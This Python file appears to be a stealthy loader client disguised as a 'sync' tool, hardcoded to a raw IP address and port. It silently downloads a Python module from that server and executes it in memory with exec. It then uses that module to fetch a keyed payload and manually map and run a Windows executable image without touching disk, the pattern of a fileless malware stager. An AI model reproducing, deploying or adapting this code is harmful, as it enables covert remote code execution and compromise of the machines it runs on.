from __future__ import annotations

import argparse
import importlib
import sys
import types
import urllib.error
import urllib.request
from typing import Any, Optional
from urllib.parse import urlparse

# ─── CONFIG ───────────────────────────────────────────────────────────────────
CONFIG: dict[str, Any] = {
    "HOST": "91.92.47.134",
    "PORT": 8765,
    "ASSET": "main",
    "API_KEY": "test123",
    "PAYLOAD_KEY": "secret456",
    "MAP_ONLY": False,
    "QUIET": True,
    "VERBOSE": False,
    "KEEP": False,
}
# ──────────────────────────────────────────────────────────────────────────────

CLIENT_MODULE = "manual_mapper.py"


def _host_port(cfg: dict) -> str:
    host = str(cfg["HOST"]).strip()
    if ":" in host and not host.startswith("["):
        host = f"[{host}]"
    return f"{host}:{cfg['PORT']}"


def _build_url(cfg: dict) -> str:
    return f"http://{_host_port(cfg)}/api/v1/sync?asset={cfg['ASSET']}"


def _server_base(sync_url: str) -> str:
    return f"{urlparse(sync_url).scheme}://{urlparse(sync_url).netloc}"


def _log(msg: str, cfg: dict) -> None:
    if cfg.get("VERBOSE") and not cfg.get("QUIET"):
        print(msg)


def _fetch_bytes(url: str, api_key: str, timeout: float = 60.0) -> bytes:
    headers = {"User-Agent": "SyncClient/1.0"}
    if api_key:
        headers["Authorization"] = f"Bearer {api_key}"
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.read()
    except urllib.error.HTTPError as exc:
        if exc.code == 404:
            raise RuntimeError(f"server missing {url}") from exc
        if exc.code == 401:
            raise RuntimeError("auth failed (401)") from exc
        raise RuntimeError(f"download HTTP {exc.code}") from exc


def _load_module_memory(name: str, data: bytes) -> None:
    mod_name = name[:-3] if name.endswith(".py") else name
    sys.modules.pop(mod_name, None)
    module = types.ModuleType(mod_name)
    module.__file__ = f"<ram:{name}>"
    module.__loader__ = None
    sys.modules[mod_name] = module
    exec(compile(data, name, "exec"), module.__dict__)  # noqa: S102


def bootstrap(cfg: dict, url: str) -> None:
    if sys.platform != "win32":
        raise RuntimeError("win32 only")
    if "manual_mapper" in sys.modules:
        _log("skip manual_mapper (ram cache)", cfg)
        return
    data = _fetch_bytes(f"{_server_base(url)}/api/v1/client/{CLIENT_MODULE}", cfg["API_KEY"])
    _load_module_memory(CLIENT_MODULE, data)
    _log("loaded manual_mapper (ram)", cfg)


def run_sync(**overrides: Any) -> int:
    """Silent run. Returns mapped image base."""
    cfg = {**CONFIG, **overrides}
    url = overrides.get("url") or _build_url(cfg)
    bootstrap(cfg, url)
    map_from_server = importlib.import_module("manual_mapper").map_from_server
    verbose = bool(cfg.get("VERBOSE") and not cfg.get("QUIET"))
    return map_from_server(
        url,
        api_key=cfg["API_KEY"],
        payload_key=cfg["PAYLOAD_KEY"],
        verbose=verbose,
        run_entry=not cfg.get("MAP_ONLY", False),
    )


def run(cfg: Optional[dict] = None) -> int:
    cfg = dict(CONFIG if cfg is None else cfg)
    try:
        base = run_sync(**cfg)
        if cfg.get("VERBOSE") and not cfg.get("QUIET"):
            print(f"0x{base:X}")
        if cfg.get("KEEP"):
            input()
        return 0
    except Exception as exc:
        if not cfg.get("QUIET"):
            print(f"Error: {exc}", file=sys.stderr)
            if cfg.get("KEEP"):
                input()
        raise


def main() -> int:
    cfg = dict(CONFIG)
    p = argparse.ArgumentParser(description="Server mapper client")
    p.add_argument("url", nargs="?", help="Override sync URL")
    p.add_argument("--api-key", default="")
    p.add_argument("--payload-key", default="")
    p.add_argument("--map-only", action="store_true")
    p.add_argument("-v", "--verbose", action="store_true")
    p.add_argument("-q", "--quiet", action="store_true")
    p.add_argument("--keep", action="store_true")
    args = p.parse_args()

    if args.url:
        url = args.url
    else:
        url = _build_url(cfg)
    if args.api_key:
        cfg["API_KEY"] = args.api_key
    if args.payload_key:
        cfg["PAYLOAD_KEY"] = args.payload_key
    if args.map_only:
        cfg["MAP_ONLY"] = True
    if args.verbose:
        cfg["VERBOSE"] = True
        cfg["QUIET"] = False
    if args.quiet:
        cfg["QUIET"] = True
        cfg["VERBOSE"] = False
    if args.keep:
        cfg["KEEP"] = True

    base = run_sync(url=url, **{k: v for k, v in cfg.items() if k != "url"})
    if not cfg.get("QUIET"):
        print(f"0x{base:X}")
    if cfg.get("KEEP"):
        input()
    return 0


if __name__ == "__main__":
    try:
        if len(sys.argv) == 1:
            raise SystemExit(run())
        raise SystemExit(main())
    except SystemExit:
        raise
    except Exception:
        if not CONFIG.get("QUIET"):
            input()
        raise SystemExit(1)
